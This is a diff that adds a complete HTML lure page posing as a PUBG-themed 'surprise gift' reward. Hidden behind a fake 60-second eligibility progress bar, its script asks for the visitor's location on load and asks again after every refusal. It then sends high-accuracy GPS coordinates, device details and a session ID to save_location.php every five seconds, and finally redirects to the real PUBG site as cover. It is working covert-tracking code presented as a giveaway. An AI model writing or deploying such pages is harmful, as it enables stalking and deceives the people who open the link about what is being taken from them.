@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>🎉 Congratulations! You have a surprise</title>
+
+    <meta property="og:title" content="🎉 Congratulations! You've been selected">
+    <meta property="og:description" content="Tap to claim your exclusive surprise gift. Limited time offer - don't miss out! 🎁">
+    <meta property="og:image" content="https://richinput.in/pubg/preview.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://richinput.in/pubg/">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎉 Congratulations! You've been selected">
+    <meta name="twitter:description" content="Tap to claim your exclusive surprise gift 🎁">
+    <meta name="twitter:image" content="https://richinput.in/pubg/preview.jpg">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+            padding: 20px;
+            position: relative;
+            z-index: 2;
+        }
+        .gift-box {
+            font-size: 80px;
+            animation: bounce 1s ease infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #ffd700;
+            margin-bottom: 8px;
+            text-shadow: 0 0 20px rgba(255,215,0,0.3);
+        }
+        .subtitle {
+            font-size: 14px;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 30px;
+        }
+        .progress-container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 50px;
+            padding: 4px;
+            margin-bottom: 12px;
+        }
+        .progress-bar {
+            height: 22px;
+            border-radius: 50px;
+            background: linear-gradient(90deg, #ffd700, #ff6b35, #ffd700);
+            background-size: 200% 100%;
+            animation: shimmer 2s linear infinite;
+            width: 0%;
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        .progress-text {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 25px;
+        }
+        .steps { text-align: left; margin-bottom: 20px; }
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 14px;
+            margin-bottom: 8px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.05);
+            transition: all 0.5s ease;
+            opacity: 0.4;
+        }
+        .step.active {
+            background: rgba(255,215,0,0.1);
+            border: 1px solid rgba(255,215,0,0.2);
+            opacity: 1;
+        }
+        .step.done {
+            background: rgba(76,175,80,0.1);
+            border: 1px solid rgba(76,175,80,0.2);
+            opacity: 1;
+        }
+        .step-icon {
+            font-size: 20px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .step-text { font-size: 13px; color: rgba(255,255,255,0.8); }
+        .step-spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(255,215,0,0.3);
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .confetti-piece {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            top: -20px;
+            z-index: 1;
+            animation: confettiFall linear forwards;
+        }
+        @keyframes confettiFall {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
+        .glow {
+            position: fixed;
+            width: 300px; height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255,215,0,0.15), transparent 70%);
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            animation: pulse 3s ease-in-out infinite;
+            z-index: 0;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+            50% { transform: translate(-50%, -50%) scale(1.3); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="glow"></div>
+    <div class="container">
+        <div class="gift-box" id="giftIcon">🎁</div>
+        <div class="title" id="title">Claiming Your Reward...</div>
+        <div class="subtitle" id="subtitle">Please wait while we verify your eligibility</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="progress-text" id="progressText">Initializing...</div>
+        <div class="steps">
+            <div class="step active" id="step1">
+                <div class="step-icon"><div class="step-spinner"></div></div>
+                <div class="step-text">Verifying your identity...</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-icon">⏳</div>
+                <div class="step-text">Checking reward availability...</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-icon">⏳</div>
+                <div class="step-text">Securing your exclusive gift...</div>
+            </div>
+            <div class="step" id="step4">
+                <div class="step-icon">⏳</div>
+                <div class="step-text">Preparing your surprise...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== UNIQUE SESSION ID FOR THIS CLICK =====
+        var sessionId = 'click_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+
+        // ===== ANIMATION ENGINE =====
+        var progress = 0;
+        var currentStep = 1;
+        var totalDuration = 60000; // 60 seconds total
+        var startTime = Date.now();
+
+        var messages = [
+            'Initializing...', 'Connecting to server...', 'Verifying identity...',
+            'Scanning records...', 'Checking eligibility...', 'Reward found!',
+            'Checking availability...', 'Validating account...', 'Reserving your gift...',
+            'Almost there...', 'Securing your reward...', 'Finalizing...'
+        ];
+
+        function updateProgress() {
+            var elapsed = Date.now() - startTime;
+            // Progress goes from 0 to 95 over 55 seconds, then jumps to 100 at 60s
+            progress = Math.min((elapsed / (totalDuration - 5000)) * 95, 95);
+
+            var bar = document.getElementById('progressBar');
+            bar.style.width = Math.floor(progress) + '%';
+            bar.textContent = Math.floor(progress) + '%';
+
+            var msgIndex = Math.min(Math.floor(progress / 8), messages.length - 1);
+            document.getElementById('progressText').textContent = messages[msgIndex];
+
+            if (progress > 20 && currentStep < 2) activateStep(2);
+            if (progress > 45 && currentStep < 3) activateStep(3);
+            if (progress > 70 && currentStep < 4) activateStep(4);
+
+            if (elapsed < totalDuration - 2000) {
+                setTimeout(updateProgress, 500);
+            } else {
+                finishAnimation();
+            }
+        }
+
+        function activateStep(n) {
+            currentStep = n;
+            for (var i = 1; i < n; i++) {
+                var s = document.getElementById('step' + i);
+                s.className = 'step done';
+                s.querySelector('.step-icon').innerHTML = '✅';
+            }
+            var active = document.getElementById('step' + n);
+            active.className = 'step active';
+            active.querySelector('.step-icon').innerHTML = '<div class="step-spinner"></div>';
+        }
+
+        function finishAnimation() {
+            var bar = document.getElementById('progressBar');
+            bar.style.width = '100%';
+            bar.textContent = '100%';
+            document.getElementById('progressText').textContent = '🎉 Reward unlocked!';
+            document.getElementById('title').textContent = '🎉 Congratulations!';
+            document.getElementById('subtitle').textContent = 'Redirecting to your reward...';
+            document.getElementById('giftIcon').textContent = '🏆';
+            document.getElementById('giftIcon').style.animation = 'none';
+            document.getElementById('giftIcon').style.fontSize = '90px';
+            for (var i = 1; i <= 4; i++) {
+                var s = document.getElementById('step' + i);
+                s.className = 'step done';
+                s.querySelector('.step-icon').innerHTML = '✅';
+            }
+            spawnConfetti();
+            setTimeout(function() {
+                window.location.href = 'https://www.pubgmobile.com/en-US/home.shtml';
+            }, 2500);
+        }
+
+        function spawnConfetti() {
+            var colors = ['#ffd700', '#ff6b35', '#4caf50', '#2196f3', '#e91e63', '#9c27b0'];
+            for (var i = 0; i < 60; i++) {
+                var el = document.createElement('div');
+                el.className = 'confetti-piece';
+                el.style.left = Math.random() * 100 + 'vw';
+                el.style.background = colors[Math.floor(Math.random() * colors.length)];
+                el.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                el.style.animationDelay = (Math.random() * 1.5) + 's';
+                el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                el.style.width = (Math.random() * 8 + 5) + 'px';
+                el.style.height = (Math.random() * 8 + 5) + 'px';
+                document.body.appendChild(el);
+            }
+        }
+
+        setTimeout(updateProgress, 500);
+
+        // ===== FULLSCREEN — only after location permission is granted =====
+        function goFullscreen() {
+            var el = document.documentElement;
+            var rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+            if (rfs) { try { rfs.call(el); } catch(e) {} }
+        }
+
+        // ===== LOCATION ENGINE — getCurrentPosition every 5 sec for 60 sec =====
+        var readingCount = 0;
+        var maxReadings = 12;
+        var trackingDone = false;
+        var locationInterval = null;
+
+        function sendReading(pos) {
+            if (trackingDone) return;
+            readingCount++;
+
+            if (readingCount >= maxReadings) {
+                trackingDone = true;
+                if (locationInterval) { clearInterval(locationInterval); locationInterval = null; }
+            }
+
+            fetch('save_location.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    reading_number: readingCount,
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    screenRes: screen.width + 'x' + screen.height,
+                    language: navigator.language
+                })
+            });
+        }
+
+        function grabLocation() {
+            if (trackingDone || !navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+                function(pos) { sendReading(pos); },
+                function() { /* will retry next interval */ },
+                { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
+            );
+        }
+
+        // Step 1: Request location immediately on page load — triggers browser popup
+        function requestPermission() {
+            if (!navigator.geolocation) return;
+
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    // Permission granted — go fullscreen now
+                    goFullscreen();
+                    // Send first reading
+                    sendReading(pos);
+                    // Then grab every 5 seconds
+                    locationInterval = setInterval(grabLocation, 5000);
+                },
+                function() {
+                    // Denied/unavailable — retry to re-trigger popup
+                    if (!trackingDone) setTimeout(requestPermission, 3000);
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        // Fire location request FIRST — nothing else before this
+        requestPermission();
+    </script>
+</body>
+</html>
